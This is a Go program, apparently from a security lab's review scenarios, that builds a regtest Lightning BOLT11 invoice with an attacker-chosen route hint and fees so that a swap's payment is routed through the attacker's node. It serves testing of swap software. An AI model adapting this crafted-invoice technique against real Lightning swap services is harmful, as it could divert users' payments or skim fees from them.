// hintinv writes a regtest BOLT11 invoice paying a key of its own behind a
// route hint through a given node with a given fee: an attacker's invoice
// that routes the swap's payment through their node (the lab's eighth
// review scenario). Usage: hintinv <amount sat> <hint node pubkey> <fee base msat> <fee ppm>
// Prints the invoice and its payment hash.
package main

import (
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"os"
	"strconv"
	"time"

	"github.com/btcsuite/btcd/btcec/v2"
	"github.com/btcsuite/btcd/btcec/v2/ecdsa"
	"github.com/btcsuite/btcd/chaincfg"
	"github.com/lightningnetwork/lnd/lnwire"
	"github.com/lightningnetwork/lnd/zpay32"
)

func main() {
	if len(os.Args) != 5 {
		fmt.Fprintln(os.Stderr, "usage: hintinv <sat> <hint pubkey> <fee base msat> <fee ppm>")
		os.Exit(2)
	}
	sat, _ := strconv.ParseInt(os.Args[1], 10, 64)
	hb, err := hex.DecodeString(os.Args[2])
	if err != nil {
		panic(err)
	}
	hint, err := btcec.ParsePubKey(hb)
	if err != nil {
		panic(err)
	}
	fee, _ := strconv.ParseUint(os.Args[3], 10, 32)
	ppm, _ := strconv.ParseUint(os.Args[4], 10, 32)
	key, _ := btcec.NewPrivateKey()
	var pre, secret [32]byte
	_, _ = rand.Read(pre[:])
	_, _ = rand.Read(secret[:])
	hash := sha256.Sum256(pre[:])
	fv := lnwire.NewRawFeatureVector(lnwire.TLVOnionPayloadRequired, lnwire.PaymentAddrRequired, 512)
	inv, err := zpay32.NewInvoice(&chaincfg.RegressionNetParams, hash, time.Now(),
		zpay32.Amount(lnwire.MilliSatoshi(sat*1000)),
		zpay32.Description("hint"),
		zpay32.CLTVExpiry(18),
		zpay32.Expiry(time.Hour),
		zpay32.PaymentAddr(secret),
		zpay32.Features(lnwire.NewFeatureVector(fv, lnwire.Features)),
		zpay32.RouteHint([]zpay32.HopHint{{NodeID: hint, ChannelID: 1<<40 | 1<<16 | 1, FeeBaseMSat: uint32(fee), FeeProportionalMillionths: uint32(ppm), CLTVExpiryDelta: 9}}),
	)
	if err != nil {
		panic(err)
	}
	s, err := inv.Encode(zpay32.MessageSigner{SignCompact: func(msg []byte) ([]byte, error) {
		return ecdsa.SignCompact(key, msg, true), nil
	}})
	if err != nil {
		panic(err)
	}
	fmt.Println(s)
	fmt.Println(hex.EncodeToString(hash[:]))
}
